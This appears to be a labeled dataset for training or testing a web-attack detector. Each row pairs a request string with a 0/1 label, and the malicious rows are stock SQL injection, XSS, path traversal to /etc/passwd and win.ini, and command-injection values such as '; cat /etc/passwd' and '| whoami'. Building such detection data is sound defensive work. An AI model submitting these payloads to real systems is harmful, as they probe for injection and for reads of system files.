<script>var a=19;alert(a)</script>,1
blog,0
/search?session=28893,0
' OR 1=1 --,1
register,0
' OR 9=9 --,1
<script>var a=357;alert(a)</script>,1
/profile?id=321,0
/search?session=26458,0
; cat /etc/passwd,1
/home?id=8556,0
<script>var a=543;alert(a)</script>,1
e3m6vVfI,0
' OR 6=1 --,1
/home?id=4866,0
' OR 1=8 --,1
/home?session=70491,0
javascript:alert(1),1
4qSYKJhaZ1kHj,0
' OR 3=5 --,1
/login?id=9802,0
/home?id=8021,0
' OR 3=9 --,1
/index?id=6054,0
3wYYFjm8,0
javascript:alert(1),1
../../../../etc/passwd,1
admin%00' OR 1=1,1
vBiGEZaEeEM,0
/login?session=33978,0
admin' --,1
settings,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
cart,0
4h5wAnpYNynIS,0
' OR 1=7 --,1
<script>var a=607;alert(a)</script>,1
index,0
home,0
/home?id=8905,0
ZYRD2yxX3zCU1Cb,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
A1mvegmo4XSE,0
<script>alert(document.cookie)</script>,1
/search?id=4497,0
/home?session=48684,0
onerror=alert(1),1
; cat /etc/passwd,1
../../../windows/win.ini,1
cart,0
G5IyDBrHVtm,0
<script>var a=595;alert(a)</script>,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 5=6 --,1
' OR 9=1 --,1
/cart?session=26970,0
admin' --,1
onerror=alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
index,0
/search?id=9858,0
admin' --,1
/cart?id=3411,0
' OR '1'='1,1
/checkout?session=85729,0
<script>var a=26;alert(a)</script>,1
/blog?session=70625,0
PQA5ggyHtr,0
onerror=alert(1),1
onerror=alert(1),1
../../../windows/win.ini,1
' OR 1=1 --,1
onerror=alert(1),1
<script>var a=62;alert(a)</script>,1
/checkout?id=5399,0
admin%00' OR 1=1,1
admin%00' OR 1=1,1
profile,0
/cart?id=4756,0
<script>var a=489;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/cart?session=93678,0
/search?session=23974,0
blog,0
<script>var a=680;alert(a)</script>,1
' OR 4=6 --,1
user,0
' OR 2=7 --,1
/cart?session=94746,0
' OR 1=1 --,1
<script>var a=427;alert(a)</script>,1
../../../windows/win.ini,1
/settings?id=9065,0
/about?id=6029,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
contact,0
s E l E c T * f R o M a d m i n,1
/settings?session=17712,0
<script>var a=421;alert(a)</script>,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?session=71680,0
/index?session=30439,0
/contact?id=4915,0
/checkout?id=9833,0
q4foCXkbVKCr,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
VXWWfhwvlXAKTf,0
' OR '1'='1,1
' OR 2=8 --,1
checkout,0
/user?session=49761,0
' OR 7=3 --,1
/search?session=99296,0
XalyawJ3y3DhiL9,0
' OR 3=6 --,1
login,0
/home?id=5154,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=992;alert(a)</script>,1
search,0
javascript:alert(1),1
tk4Xjp5FwiFSNU,0
admin' --,1
' OR 1=9 --,1
settings,0
/search?session=59119,0
index,0
/register?session=46773,0
/index?id=5453,0
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 1=1 --,1
J3HSyQgnIi,0
../../../../etc/passwd,1
/search?session=91156,0
contact,0
' OR 1=5 --,1
5PafBYYc,0
login,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 4=5 --,1
cart,0
settings,0
admin'/* bypass */OR 1=1,1
<script>var a=585;alert(a)</script>,1
/search?id=2054,0
' OR 3=6 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?id=6835,0
admin'/* bypass */OR 1=1,1
/cart?id=4104,0
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
/settings?id=2406,0
' OR '1'='1,1
login,0
<script>var a=383;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/contact?session=99280,0
profile,0
s E l E c T * f R o M a d m i n,1
/index?id=6673,0
' OR 2=5 --,1
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
admin' --,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
javascript:alert(1),1
' OR 3=1 --,1
' OR 3=9 --,1
/register?session=54878,0
' OR '1'='1,1
about,0
admin' --,1
/contact?session=51679,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/login?id=8522,0
' OR 1=5 --,1
<script>var a=955;alert(a)</script>,1
<script>var a=413;alert(a)</script>,1
' OR 3=9 --,1
admin%00' OR 1=1,1
/blog?session=59805,0
admin%00' OR 1=1,1
/contact?id=281,0
<script>var a=80;alert(a)</script>,1
onerror=alert(1),1
' OR '1'='1,1
MtyXECi3T0x,0
admin' --,1
' OR 6=7 --,1
vc6D1AT3H,0
javascript:alert(1),1
' OR 9=1 --,1
/profile?id=4126,0
/index?id=539,0
checkout,0
checkout,0
admin%00' OR 1=1,1
U0kaXw7phNX,0
login,0
' OR 1=1 --,1
/cart?session=54965,0
' OR 6=1 --,1
/blog?session=86149,0
home,0
WOHiGblKz2K2nsV,0
/contact?id=3710,0
admin%00' OR 1=1,1
; cat /etc/passwd,1
../../../windows/win.ini,1
s E l E c T * f R o M a d m i n,1
/register?id=3465,0
dashboard,0
index,0
<script>var a=256;alert(a)</script>,1
admin' --,1
contact,0
' OR 2=6 --,1
<script>var a=273;alert(a)</script>,1
/home?session=20346,0
<script>alert(document.cookie)</script>,1
search,0
NN2tnVTIw4Ts,0
../../../windows/win.ini,1
' OR 8=3 --,1
' OR '1'='1,1
<script>var a=919;alert(a)</script>,1
../../../../etc/passwd,1
/checkout?id=8671,0
s E l E c T * f R o M a d m i n,1
/cart?id=1831,0
' OR 4=4 --,1
' OR 1=1 --,1
admin'/* bypass */OR 1=1,1
admin' --,1
/home?session=85652,0
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
/contact?session=32080,0
WAwTZu2apeN,0
cart,0
1' o r '1'='1,1
onerror=alert(1),1
/checkout?session=49362,0
/search?id=4586,0
/search?session=70548,0
' OR 1=1 --,1
settings,0
| whoami,1
admin%00' OR 1=1,1
javascript:alert(1),1
' OR '1'='1,1
/about?id=8196,0
/home?id=3011,0
/search?id=9574,0
' OR 9=4 --,1
<script>var a=483;alert(a)</script>,1
/checkout?session=51204,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=974;alert(a)</script>,1
/blog?id=3222,0
/register?session=59685,0
/user?session=21026,0
admin%00' OR 1=1,1
admin'/* bypass */OR 1=1,1
' OR '1'='1,1
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
FRmtC6FkFUhMzL0,0
/checkout?session=28354,0
about,0
iEvXRxwZQw1Do2h,0
| whoami,1
1' o r '1'='1,1
contact,0
; cat /etc/passwd,1
admin%00' OR 1=1,1
about,0
/contact?session=57408,0
login,0
/blog?session=85305,0
register,0
/about?session=13717,0
admin'/* bypass */OR 1=1,1
| whoami,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
X74dCZzZFZ589,0
admin%00' OR 1=1,1
/checkout?id=4447,0
/search?session=70725,0
admin%00' OR 1=1,1
/search?session=86825,0
' OR 5=3 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 5=4 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
e2dctRCG,0
admin%00' OR 1=1,1
/home?id=5261,0
admin%00' OR 1=1,1
/dashboard?session=21016,0
index,0
/contact?session=68444,0
/login?id=8595,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=936;alert(a)</script>,1
register,0
VX6gy87W,0
<script>var a=532;alert(a)</script>,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
mHXwsDdN,0
/dashboard?session=80318,0
/contact?id=767,0
onerror=alert(1),1
sqhYyvBdG,0
UiPBs4grm,0
admin' --,1
../../../windows/win.ini,1
/register?session=16715,0
' OR 1=1 --,1
onerror=alert(1),1
/login?session=34416,0
; cat /etc/passwd,1
onerror=alert(1),1
/register?id=4146,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
<script>var a=401;alert(a)</script>,1
jw46NKggggIK7,0
<script>var a=935;alert(a)</script>,1
contact,0
user,0
../../../windows/win.ini,1
eOrQdfpoEHXOab,0
/home?session=92900,0
search,0
/blog?session=90840,0
| whoami,1
/login?session=15607,0
KLIurSzlrr5MQ,0
<script>alert(document.cookie)</script>,1
<script>var a=450;alert(a)</script>,1
xT2A72Ux8xT0z,0
checkout,0
cyeVfLre5Uf4mwN,0
settings,0
/settings?session=94364,0
HuIWe986R6w,0
/checkout?id=4213,0
/index?session=28894,0
../../../windows/win.ini,1
/register?session=74117,0
1' o r '1'='1,1
/register?session=60546,0
/user?session=23923,0
OjyZ7OHUXXmszQ,0
' OR 9=9 --,1
| whoami,1
OxgFVy3TzCXGey2,0
javascript:alert(1),1
| whoami,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
| whoami,1
ryR8FZprPQ,0
settings,0
onerror=alert(1),1
' OR 3=6 --,1
login,0
admin' --,1
<script>alert(document.cookie)</script>,1
1zyjv3rYXT8z8,0
<script>var a=509;alert(a)</script>,1
/profile?id=8932,0
/index?id=120,0
/search?id=1693,0
admin'/* bypass */OR 1=1,1
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
<script>var a=436;alert(a)</script>,1
<script>var a=127;alert(a)</script>,1
/profile?session=75527,0
profile,0
' OR 4=5 --,1
<script>var a=366;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
' OR 8=2 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
../../../windows/win.ini,1
gN05rUBHwt1,0
/profile?session=32837,0
<script>var a=489;alert(a)</script>,1
/blog?session=58127,0
; cat /etc/passwd,1
/checkout?session=89945,0
/search?id=6951,0
<script>var a=324;alert(a)</script>,1
eukLOt75o,0
; cat /etc/passwd,1
' OR '1'='1,1
<script>alert(document.cookie)</script>,1
Dvrg1Krc,0
/about?id=1667,0
/about?session=60454,0
../../../../etc/passwd,1
fgIk6YYM5aLq,0
cart,0
register,0
1' o r '1'='1,1
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 7=8 --,1
/cart?id=5953,0
<script>var a=100;alert(a)</script>,1
' OR 8=7 --,1
' OR 1=1 --,1
admin' --,1
/login?id=9587,0
<script>var a=812;alert(a)</script>,1
javascript:alert(1),1
/register?id=1138,0
/about?session=38040,0
checkout,0
' OR '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
<script>var a=662;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
| whoami,1
<script>var a=777;alert(a)</script>,1
; cat /etc/passwd,1
dashboard,0
/index?id=1136,0
<script>var a=611;alert(a)</script>,1
' OR 3=7 --,1
/about?session=24652,0
s E l E c T * f R o M a d m i n,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=6367,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
contact,0
' OR 8=2 --,1
b0YbwqKrBnl0t,0
../../../windows/win.ini,1
' OR '1'='1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
search,0
dashboard,0
blog,0
2tlaHEDHH,0
dashboard,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
blog,0
dashboard,0
/login?session=31997,0
/search?session=31355,0
<script>var a=679;alert(a)</script>,1
DwruuXZUYy,0
<script>var a=495;alert(a)</script>,1
register,0
/settings?session=91908,0
/settings?session=60675,0
' OR '1'='1,1
/home?id=6444,0
<script>var a=44;alert(a)</script>,1
admin%00' OR 1=1,1
javascript:alert(1),1
' OR '1'='1,1
1' o r '1'='1,1
cart,0
../../../windows/win.ini,1
/about?id=9061,0
/cart?session=46758,0
admin' --,1
sCmCdwk9mUWa,0
10AYrEiRLtrP,0
' OR 9=5 --,1
onerror=alert(1),1
SqSrQRjXZ9ek,0
/cart?id=845,0
' OR 9=4 --,1
' OR 1=7 --,1
<script>alert(document.cookie)</script>,1
admin%00' OR 1=1,1
login,0
admin%00' OR 1=1,1
' OR 8=8 --,1
/home?session=80170,0
onerror=alert(1),1
/contact?id=7064,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/checkout?session=27254,0
<script>var a=548;alert(a)</script>,1
../../../windows/win.ini,1
search,0
/user?session=96064,0
| whoami,1
s E l E c T * f R o M a d m i n,1
search,0
/settings?session=82437,0
/checkout?session=56040,0
<script>var a=620;alert(a)</script>,1
/register?session=50710,0
dashboard,0
/about?session=35387,0
| whoami,1
../../../windows/win.ini,1
/dashboard?id=3516,0
' OR 2=7 --,1
../../../windows/win.ini,1
/contact?id=6062,0
/checkout?id=7462,0
' OR 9=8 --,1
DVckzyrh,0
/search?session=26111,0
../../../windows/win.ini,1
about,0
XnGnHcQQA,0
' OR 7=6 --,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/index?id=1199,0
contact,0
admin%00' OR 1=1,1
' OR 1=2 --,1
javascript:alert(1),1
' OR 7=7 --,1
login,0
admin%00' OR 1=1,1
settings,0
javascript:alert(1),1
/profile?id=8853,0
| whoami,1
dashboard,0
' OR 8=2 --,1
; cat /etc/passwd,1
s E l E c T * f R o M a d m i n,1
/home?id=9145,0
/contact?id=6338,0
1' o r '1'='1,1
<script>var a=854;alert(a)</script>,1
/checkout?id=1417,0
/login?session=63517,0
../../../windows/win.ini,1
../../../windows/win.ini,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
3VS4BpYZ,0
' OR 1=1 --,1
<script>var a=408;alert(a)</script>,1
onerror=alert(1),1
A4Kuy5OZcs6YfoB,0
' OR 8=6 --,1
qyRWWpajmZCv,0
/checkout?session=69882,0
' OR 9=2 --,1
KwUzMTKa3buHfZf,0
siJDOLm5K7Wm1Q,0
6QO4siPTUJp2HHb,0
/home?id=5528,0
1' o r '1'='1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/about?id=5462,0
<script>var a=674;alert(a)</script>,1
1' o r '1'='1,1
/register?session=41434,0
/settings?session=72812,0
yeHKMkCulkIhD,0
<script>var a=491;alert(a)</script>,1
/dashboard?id=6351,0
blog,0
b3UK1ZkuIA,0
; cat /etc/passwd,1
kNrqV5HFRC,0
tvfISLVUcemSvv,0
../../../../etc/passwd,1
BKG7sSIPvF,0
4W7kCsuv0Xz,0
javascript:alert(1),1
/blog?session=52699,0
/profile?session=61256,0
/contact?session=83504,0
Asill6KXlkR,0
1' o r '1'='1,1
/settings?id=3655,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
<script>var a=583;alert(a)</script>,1
/index?id=6961,0
s E l E c T * f R o M a d m i n,1
s E l E c T * f R o M a d m i n,1
' OR 1=5 --,1
<script>var a=530;alert(a)</script>,1
<script>var a=767;alert(a)</script>,1
<script>var a=990;alert(a)</script>,1
T1vJM1JH,0
' OR 2=8 --,1
/contact?id=5998,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
NNFCqEtcbvK0,0
/checkout?id=7681,0
/about?id=9705,0
<script>var a=228;alert(a)</script>,1
' OR 1=6 --,1
mcH2Cl0gXGjjfGV,0
/index?session=44755,0
LCwTrNf56JcF,0
/profile?id=3271,0
/dashboard?session=52310,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/dashboard?id=3412,0
HipfmYobOIZyM,0
' OR 5=8 --,1
/checkout?session=76675,0
blog,0
../../../windows/win.ini,1
/home?id=9332,0
settings,0
eWgB2Xpmi,0
s3ioFjdb7VHxJMV,0
/home?session=95678,0
' OR 6=7 --,1
; cat /etc/passwd,1
G6Q38pU5i2XQRF,0
<script>var a=324;alert(a)</script>,1
rLDO18tgBrg,0
login,0
/settings?id=9736,0
register,0
profile,0
onerror=alert(1),1
| whoami,1
/about?id=7113,0
BSrPTUAEEE,0
' OR 8=7 --,1
<script>alert(document.cookie)</script>,1
' OR 4=1 --,1
' OR 6=8 --,1
3nFxxEBfKt,0
| whoami,1
profile,0
cart,0
/dashboard?id=5439,0
tEfDLopPpKl,0
/index?id=6396,0
/checkout?session=36142,0
about,0
admin' --,1
<script>var a=444;alert(a)</script>,1
blog,0
index,0
register,0
admin%00' OR 1=1,1
kT9727Gt2UbXIC,0
BnG7K2f3X3,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
/search?session=79989,0
/login?session=59905,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
login,0
s E l E c T * f R o M a d m i n,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin%00' OR 1=1,1
' OR 5=8 --,1
blog,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/blog?id=7069,0
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
javascript:alert(1),1
admin'/* bypass */OR 1=1,1
search,0
/user?id=3615,0
<script>var a=28;alert(a)</script>,1
/cart?session=35383,0
/user?id=1921,0
admin' --,1
/about?id=3077,0
<script>var a=917;alert(a)</script>,1
onerror=alert(1),1
mrjyqu36CbZkQI,0
s E l E c T * f R o M a d m i n,1
/home?session=33759,0
<script>var a=2;alert(a)</script>,1
javascript:alert(1),1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/checkout?id=6380,0
| whoami,1
onerror=alert(1),1
/profile?id=8195,0
1' o r '1'='1,1
contact,0
/register?id=8251,0
<script>var a=203;alert(a)</script>,1
/search?id=6456,0
javascript:alert(1),1
/home?id=4707,0
/about?id=8150,0
1' o r '1'='1,1
; cat /etc/passwd,1
contact,0
h4BqjV5I,0
admin'/* bypass */OR 1=1,1
<script>alert(document.cookie)</script>,1
<script>var a=771;alert(a)</script>,1
/settings?id=4910,0
qheAeret2frRK4,0
<script>var a=284;alert(a)</script>,1
<script>var a=37;alert(a)</script>,1
<script>var a=357;alert(a)</script>,1
/login?id=7373,0
<script>var a=418;alert(a)</script>,1
8edFBgCPbR1ED,0
<script>var a=791;alert(a)</script>,1
1' o r '1'='1,1
/settings?id=8824,0
/profile?id=6935,0
; cat /etc/passwd,1
' OR 6=6 --,1
register,0
/checkout?session=41996,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/about?id=1067,0
LZJ0mWkJAv2fw,0
/profile?session=38934,0
' OR 2=7 --,1
/home?session=67381,0
user,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
/index?id=8982,0
/cart?id=9483,0
../../../../etc/passwd,1
admin'/* bypass */OR 1=1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
' OR 8=4 --,1
<script>var a=463;alert(a)</script>,1
/contact?session=85826,0
cKLW8VoTyB5gMZi,0
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
../../../windows/win.ini,1
m3X6OUvd5y,0
0QcK6wqiy9Rg,0
/about?id=7967,0
/profile?session=74219,0
<script>var a=802;alert(a)</script>,1
home,0
admin'/* bypass */OR 1=1,1
cart,0
<script>var a=581;alert(a)</script>,1
' OR 9=6 --,1
' OR 7=8 --,1
<script>var a=930;alert(a)</script>,1
admin' --,1
' OR 5=6 --,1
/cart?id=7900,0
/checkout?id=9944,0
| whoami,1
javascript:alert(1),1
s E l E c T * f R o M a d m i n,1
' OR 1=1 --,1
/settings?session=94196,0
6uHmlQaGV6Ow8,0
login,0
home,0
<script>var a=536;alert(a)</script>,1
/checkout?session=47074,0
1' o r '1'='1,1
xGEoSU803Gh,0
javascript:alert(1),1
U N I O N   S E L E C T   * F R O M   u s e r s,1
admin' --,1
' OR 1=1 --,1
/search?session=25952,0
IR9AzyiU9VZ0O,0
' OR 7=2 --,1
68ty8OcKwTttVaO,0
s E l E c T * f R o M a d m i n,1
<script>var a=35;alert(a)</script>,1
admin' --,1
gdTwzIH9,0
search,0
cart,0
<script>var a=424;alert(a)</script>,1
<script>var a=645;alert(a)</script>,1
contact,0
/dashboard?session=29746,0
admin%00' OR 1=1,1
' OR 2=4 --,1
search,0
javascript:alert(1),1
register,0
/home?session=98743,0
' OR 7=6 --,1
s E l E c T * f R o M a d m i n,1
<script>var a=516;alert(a)</script>,1
vfBK6fl3Exczr,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
admin%00' OR 1=1,1
/about?session=81623,0
<script>alert(document.cookie)</script>,1
profile,0
/checkout?id=9060,0
admin'/* bypass */OR 1=1,1
admin' --,1
login,0
/about?session=91789,0
qpzxEPxIKsyH1PP,0
<script>var a=681;alert(a)</script>,1
/blog?session=59841,0
<script>var a=971;alert(a)</script>,1
' OR 1=1 --,1
contact,0
admin' --,1
/dashboard?session=25772,0
/checkout?session=70557,0
/settings?id=9704,0
ziIs4HGMYRaZy,0
/login?session=23563,0
admin%00' OR 1=1,1
register,0
home,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
checkout,0
/dashboard?session=40174,0
' OR 9=8 --,1
/blog?id=222,0
../../../../etc/passwd,1
/register?session=41233,0
' OR 8=8 --,1
s E l E c T * f R o M a d m i n,1
' OR 6=6 --,1
/profile?id=8021,0
user,0
' OR 1=1 --,1
' OR 9=7 --,1
../../../../etc/passwd,1
EhiGxIzS059QRv,0
/user?id=417,0
index,0
/index?session=17564,0
/search?id=3172,0
' OR 9=5 --,1
/profile?id=4395,0
' OR 2=7 --,1
<script>var a=792;alert(a)</script>,1
1' o r '1'='1,1
onerror=alert(1),1
admin' --,1
AVtMqa2UqV,0
user,0
/user?session=81390,0
search,0
<script>var a=348;alert(a)</script>,1
/cart?id=6883,0
nhpMFz8PLo2y,0
<script>var a=740;alert(a)</script>,1
/register?session=54151,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
s E l E c T * f R o M a d m i n,1
settings,0
../../../windows/win.ini,1
rc1HXFl3XFlsXda,0
home,0
admin%00' OR 1=1,1
admin%00' OR 1=1,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
user,0
<script>var a=409;alert(a)</script>,1
/settings?session=99141,0
onerror=alert(1),1
onerror=alert(1),1
<script>var a=870;alert(a)</script>,1
/register?id=5604,0
user,0
' OR 1=1 --,1
s E l E c T * f R o M a d m i n,1
; cat /etc/passwd,1
/search?session=15153,0
/checkout?session=30440,0
/home?session=48051,0
' OR 8=6 --,1
1' o r '1'='1,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
../../../windows/win.ini,1
/checkout?id=519,0
' OR 6=2 --,1
j0K2s2qd,0
<script>var a=669;alert(a)</script>,1
/home?session=41981,0
' OR 9=2 --,1
index,0
admin'/* bypass */OR 1=1,1
blog,0
' OR 7=5 --,1
' OR 1=1 --,1
admin%00' OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
profile,0
voHPjzxykWUSiHB,0
' OR '1'='1,1
/login?session=53346,0
cart,0
' OR 4=7 --,1
1' o r '1'='1,1
<script>var a=251;alert(a)</script>,1
/cart?id=930,0
' OR '1'='1,1
<script>var a=378;alert(a)</script>,1
eqh2XFmFwN,0
' OR 5=6 --,1
9WJpSeu6vYaG,0
/search?id=4159,0
admin'/* bypass */OR 1=1,1
3z7bHkEPx4,0
ZxedW8hlDXA,0
<script>var a=562;alert(a)</script>,1
SM7slI4oyd54k,0
checkout,0
pyAD1MGFV9,0
' OR 3=4 --,1
<script>alert(document.cookie)</script>,1
settings,0
<script>var a=842;alert(a)</script>,1
/about?id=6394,0
../../../../etc/passwd,1
/dashboard?session=97330,0
dashboard,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
' OR 3=2 --,1
<script>var a=28;alert(a)</script>,1
cart,0
<script>var a=824;alert(a)</script>,1
/contact?id=2750,0
index,0
/index?session=77211,0
/register?session=68948,0
../../../windows/win.ini,1
<script>var a=698;alert(a)</script>,1
<script>var a=141;alert(a)</script>,1
QhMqms5f4yJm,0
admin' --,1
ylQ5F1IEKO,0
/search?id=760,0
user,0
/cart?session=58940,0
' OR '1'='1,1
search,0
' OR 2=1 --,1
login,0
/blog?id=8028,0
/blog?session=48580,0
U N I O N   S E L E C T   * F R O M   u s e r s,1
| whoami,1
; cat /etc/passwd,1
/checkout?session=18922,0
/blog?id=9571,0
RakE1ZRTI3ih28,0
' OR 1=7 --,1
/register?session=13169,0
settings,0
/login?session=43598,0
/user?session=30825,0
' OR 3=8 --,1
<script>var a=195;alert(a)</script>,1
/home?id=2607,0
admin' --,1
/register?session=20717,0
/blog?id=5460,0
' OR 7=6 --,1
<script>var a=471;alert(a)</script>,1
' OR 9=3 --,1
1' o r '1'='1,1
../../../../etc/passwd,1
<script>var a=456;alert(a)</script>,1
vpq5IOTZx,0
/contact?session=70332,0
' OR 3=3 --,1
dashboard,0
<script>alert(document.cookie)</script>,1
settings,0
FvKmh5hlEpsccHp,0
/login?session=69325,0
/profile?id=2746,0
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
/cart?id=1717,0
login,0
admin'/* bypass */OR 1=1,1
' OR 4=1 --,1
/search?session=46508,0
<script>var a=500;alert(a)</script>,1
<script>var a=757;alert(a)</script>,1
settings,0
mPff2qvz9k4H6x,0
yFETySipqJmAFto,0
../../../windows/win.ini,1
' OR 4=6 --,1
' OR 1=1 --,1
X77CowrLmqIiT2y,0
/cart?session=80313,0
' OR 6=6 --,1
; cat /etc/passwd,1
' OR 1=1 --,1
user,0
' OR 1=1 --,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
' OR 3=3 --,1
' OR 3=3 --,1
' OR 6=8 --,1
login,0
td8VgDyObnzQvao,0
search,0
/settings?id=8314,0
/user?session=68174,0
6Cb7XXwncl,0
login,0
6g8p1VAFUArk,0
lCWRObqM4fuK5,0
<script>var a=860;alert(a)</script>,1
' OR 8=3 --,1
BZ7Hn4K3RUHC,0
/settings?id=3329,0
admin'/* bypass */OR 1=1,1
<sCrIpT>pRoMpT('Hacked')</ScRiPt>,1
/search?session=16251,0
/about?session=58102,0
/register?id=7257,0
user,0
ZnH7DizST,0
/checkout?session=23282,0
' OR 2=6 --,1
s5nS1o6fE,0
' OR '1'='1,1
/settings?id=9180,0
admin%00' OR 1=1,1
index,0
zO4xirqP7,0
settings,0
' OR 7=8 --,1
<script>var a=309;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?id=3541,0
index,0
blog,0
' OR 9=7 --,1
admin%00' OR 1=1,1
/blog?id=5716,0
login,0
search,0
<script>var a=82;alert(a)</script>,1
admin%00' OR 1=1,1
search,0
1' o r '1'='1,1
/search?id=3741,0
../../../../etc/passwd,1
' OR 2=2 --,1
/register?id=9816,0
b9qePYcWXb1ccC,0
/login?id=2204,0
' OR 2=9 --,1
%3Cscript%3Ealert(1)%3C%2Fscript%3E,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/contact?id=8849,0
' OR 7=5 --,1
../../../windows/win.ini,1
/checkout?id=6104,0
/search?session=17506,0
z0MJJ4uk3fB,0
index,0
<script>var a=744;alert(a)</script>,1
../../../../etc/passwd,1
/contact?session=35402,0
<script>var a=732;alert(a)</script>,1
1' o r '1'='1,1
user,0
/search?id=85,0
../../../windows/win.ini,1
/contact?session=53367,0
U2NsuE8tee,0
1' o r '1'='1,1
' OR 7=1 --,1
Hpsl2Ow5jd2g3fh,0
' OR 3=8 --,1
' OR 1=6 --,1
/about?id=8700,0
' OR 3=2 --,1
<script>var a=783;alert(a)</script>,1
index,0
profile,0
' OR 5=8 --,1
cart,0
/home?id=4714,0
' OR 9=6 --,1
../../../windows/win.ini,1
onerror=alert(1),1
/user?id=3051,0
user,0
<script>var a=764;alert(a)</script>,1
U N I O N   S E L E C T   * F R O M   u s e r s,1
/profile?id=3244,0
/about?id=8154,0
<script>var a=407;alert(a)</script>,1
/index?id=8189,0
/register?id=8735,0
' OR 1=4 --,1
/search?id=4541,0
/login?session=90727,0
/index?id=2635,0
onerror=alert(1),1
/register?session=87405,0
search,0
admin%00' OR 1=1,1
user,0
onerror=alert(1),1
; cat /etc/passwd,1
/register?session=34817,0
index,0
admin%00' OR 1=1,1
cart,0
XFg2p3o1fhnfQI,0
login,0
HtgZjAa70,0
login,0
/home?session=78997,0
about,0
javascript:alert(1),1
YasqiSrS0cpUL,0
/cart?session=92687,0
/checkout?id=1362,0
F4yaqv9Er,0
| whoami,1
/cart?id=9039,0
/cart?session=20980,0
<script>alert(document.cookie)</script>,1
contact,0
/login?id=3514,0
S3YknxSU,0
/checkout?id=7363,0
admin' --,1
admin'/* bypass */OR 1=1,1
<script>var a=770;alert(a)</script>,1
<script>var a=433;alert(a)</script>,1
/home?session=91933,0
javascript:alert(1),1
' OR 3=4 --,1
<script>var a=186;alert(a)</script>,1
' OR 7=2 --,1
' OR '1'='1,1
hnRHzsW9z,0
' OR 8=1 --,1
<script>var a=285;alert(a)</script>,1
<script>var a=97;alert(a)</script>,1
/register?session=95505,0
' OR 3=4 --,1
onerror=alert(1),1
' OR 8=9 --,1
27f0qwEDd0cOciy,0
/settings?session=23460,0
<script>var a=627;alert(a)</script>,1
<script>var a=269;alert(a)</script>,1
/register?session=36388,0
search,0
<script>var a=2;alert(a)</script>,1
' OR 2=5 --,1
onerror=alert(1),1
/search?id=4726,0
/dashboard?id=4027,0
onerror=alert(1),1
' OR 2=6 --,1
/checkout?session=31929,0
/cart?session=58670,0
